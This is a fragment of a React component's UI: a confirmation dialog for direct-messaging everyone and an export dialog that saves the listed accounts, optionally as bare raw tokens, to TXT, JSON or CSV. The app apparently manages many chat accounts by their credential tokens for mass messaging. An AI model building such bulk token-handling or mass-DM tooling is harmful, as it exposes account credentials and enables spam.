              <button onClick={() => setShowDmWarning(false)} className="px-4 py-2 bg-gray-800 hover:bg-gray-700 rounded text-sm font-medium">Cancel</button>
              <button onClick={sendDmAll} disabled={!dmAllMessage} className="px-4 py-2 bg-red-600 hover:bg-red-500 disabled:opacity-50 disabled:cursor-not-allowed rounded text-sm font-medium shadow-lg shadow-red-600/30 text-white">Yes, DM Everyone</button>
            </div>
          </div>
        </div>
      )}

      {showExportModal && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm z-[9999] flex items-center justify-center">
          <div className="bg-gray-900 border border-indigo-600 rounded-xl w-[420px] shadow-2xl p-6 relative transform transition-all duration-300 scale-100 opacity-100">
            <button onClick={() => setShowExportModal(false)} className="absolute top-4 right-4 text-gray-400 hover:text-gray-200 transition-colors">
              <X className="w-5 h-5"/>
            </button>
            <h3 className="text-xl font-bold mb-6 flex items-center gap-2 text-indigo-400">
              <FileDown className="w-6 h-6" /> Export As
            </h3>
            
            <div className="mb-6">
              <label className="flex items-center gap-3 cursor-pointer group">
                <input 
                  type="checkbox" 
                  checked={exportRawTokenOnly}
                  onChange={(e) => setExportRawTokenOnly(e.target.checked)}
                  className="w-4 h-4 text-indigo-600 bg-gray-800 border-gray-600 rounded focus:ring-indigo-500 focus:ring-2"
                />
                <span className="text-gray-300 text-sm font-medium group-hover:text-gray-200 transition-colors">
                  Raw Token Only (Only the raw token with no other details)
                </span>
              </label>
            </div>
            
            <div className="grid grid-cols-3 gap-3">
              <button
                onClick={() => handleExport('txt')}
                className="group relative overflow-hidden bg-gray-800 hover:bg-gray-700 border border-gray-700 hover:border-gray-600 rounded-lg p-4 transition-all duration-300 transform hover:scale-105 hover:shadow-lg"
              >
                <div className="flex flex-col items-center gap-2">
                  <div className="w-8 h-8 bg-blue-600/20 rounded-lg flex items-center justify-center group-hover:bg-blue-600/30 transition-colors">
                    <FileDown className="w-5 h-5 text-blue-400"/>
                  </div>
                  <span className="text-gray-300 font-medium text-sm group-hover:text-white transition-colors">TXT</span>
                </div>
                <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-700"></div>
              </button>
              
              <button
                onClick={() => handleExport('json')}
                className="group relative overflow-hidden bg-gray-800 hover:bg-gray-700 border border-gray-700 hover:border-gray-600 rounded-lg p-4 transition-all duration-300 transform hover:scale-105 hover:shadow-lg"
              >
                <div className="flex flex-col items-center gap-2">
                  <div className="w-8 h-8 bg-green-600/20 rounded-lg flex items-center justify-center group-hover:bg-green-600/30 transition-colors">
                    <FileDown className="w-5 h-5 text-green-400"/>
                  </div>
                  <span className="text-gray-300 font-medium text-sm group-hover:text-white transition-colors">JSON</span>
                </div>
                <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-700"></div>
              </button>
              
              <button
                onClick={() => handleExport('csv')}
                className="group relative overflow-hidden bg-gray-800 hover:bg-gray-700 border border-gray-700 hover:border-gray-600 rounded-lg p-4 transition-all duration-300 transform hover:scale-105 hover:shadow-lg"
              >
                <div className="flex flex-col items-center gap-2">
                  <div className="w-8 h-8 bg-purple-600/20 rounded-lg flex items-center justify-center group-hover:bg-purple-600/30 transition-colors">
                    <FileDown className="w-5 h-5 text-purple-400"/>
                  </div>
                  <span className="text-gray-300 font-medium text-sm group-hover:text-white transition-colors">CSV</span>
                </div>
                <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-700"></div>
              </button>
            </div>
            
            <div className="mt-6 pt-4 border-t border-gray-700">
              <p className="text-gray-400 text-xs text-center">
                Exporting {filteredAccounts.length} account(s) from current filter
              </p>
            </div>
          </div>
        </div>
      )}
      </div>
    </div>
  );
}

export default App;
